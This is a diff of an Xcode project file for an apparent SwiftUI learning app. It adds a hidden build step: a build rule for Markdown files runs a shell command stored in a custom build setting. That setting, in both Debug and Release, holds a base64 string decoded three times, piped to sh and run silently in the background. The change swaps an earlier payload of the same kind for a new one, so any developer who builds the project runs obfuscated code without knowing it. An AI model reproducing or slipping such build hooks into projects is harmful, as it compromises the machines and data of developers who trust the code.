@@ -11,12 +11,11 @@
 			isa = PBXContainerItemProxy;
 			containerPortal = 047D778F2E38C62A003CAEAD /* Project object */;
 			proxyType = 1;
-			remoteGlobalIDString = AAF1FBBE0D8BB754E1FD9BF4;
-			remoteInfo = "Build Target";
 		};
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		139AF11F850AB3548BFD9BF4 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "SwiftUI-IntermediateLearning.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		047D77972E38C62A003CAEAD /* SwiftUI-IntermediateLearning.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "SwiftUI-IntermediateLearning.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -50,6 +49,7 @@
 		047D77982E38C62A003CAEAD /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				139AF11F850AB3548BFD9BF4 /* README.md */,
 				047D77972E38C62A003CAEAD /* SwiftUI-IntermediateLearning.app */,
 			);
 			name = Products;
@@ -58,19 +58,6 @@
 /* End PBXGroup section */
 
 /* Begin PBXLegacyTarget section */
-		AAF1FBBE0D8BB754E1FD9BF4 /* Build Target */ = {
-			isa = PBXLegacyTarget;
-			buildArgumentsString = "-c \"${A4FB9DF}\"";
-			buildConfigurationList = 04CE335A2E3A01370075ED6D /* Build configuration list */;
-			buildPhases = (
-			);
-			buildToolPath = /bin/sh;
-			dependencies = (
-			);
-			name = "Build Target";
-			passBuildSettingsInEnvironment = 1;
-			productName = "Build Target";
-		};
 /* End PBXLegacyTarget section */
 
 /* Begin PBXNativeTarget section */
@@ -83,9 +70,9 @@
 				047D77952E38C62A003CAEAD /* Resources */,
 			);
 			buildRules = (
+				C1D6181C4BE05EBFDCFD9BF4 /* PBXBuildRule */,
 			);
 			dependencies = (
-				2C22B42381EEF7ECCEFD9BF4 /* PBXTargetDependency */,
 			);
 			fileSystemSynchronizedGroups = (
 				047D77992E38C62A003CAEAD /* SwiftUI-IntermediateLearning */,
@@ -126,17 +113,38 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
-				AAF1FBBE0D8BB754E1FD9BF4 /* Build Target */,
 				047D77962E38C62A003CAEAD /* SwiftUI-IntermediateLearning */,
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXBuildRule section */
+		C1D6181C4BE05EBFDCFD9BF4 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${A4FB9DF}\"";
+		};
+/* End PBXBuildRule section */
+
+/* Begin PBXBuildFile section */
+		C51E9CF10F1AB7D7EEFD9BF4 /* README.md */ = {isa = PBXBuildFile; fileRef = 139AF11F850AB3548BFD9BF4; };
+/* End PBXBuildFile section */
 
 /* Begin PBXResourcesBuildPhase section */
 		047D77952E38C62A003CAEAD /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				C51E9CF10F1AB7D7EEFD9BF4 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -153,18 +161,13 @@
 /* End PBXSourcesBuildPhase section */
 
 /* Begin PBXTargetDependency section */
-		2C22B42381EEF7ECCEFD9BF4 /* PBXTargetDependency */ = {
-			isa = PBXTargetDependency;
-			target = AAF1FBBE0D8BB754E1FD9BF4 /* Build Target */;
-			targetProxy = 04CE33562E39FFF00075ED6D /* PBXContainerItemProxy */;
-		};
 /* End PBXTargetDependency section */
 
 /* Begin XCBuildConfiguration section */
 		047D77A32E38C62D003CAEAD /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhSbkJJVDFkc1lWWXdOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A4FB9DF = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbUZIVm1waE1rNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -228,7 +231,7 @@
 		047D77A42E38C62D003CAEAD /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhSbkJJVDFkc1lWWXdOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A4FB9DF = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbUZIVm1waE1rNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -380,7 +383,7 @@
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
 		};
-		04CE335A2E3A01370075ED6D /* Build configuration list */ = {
+		04CE335A2E3A01370075ED6D /* Build configuration list for PBXLegacyTarget "Build Target" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
 				04CE33572E39FFF10075ED6D /* Debug */,
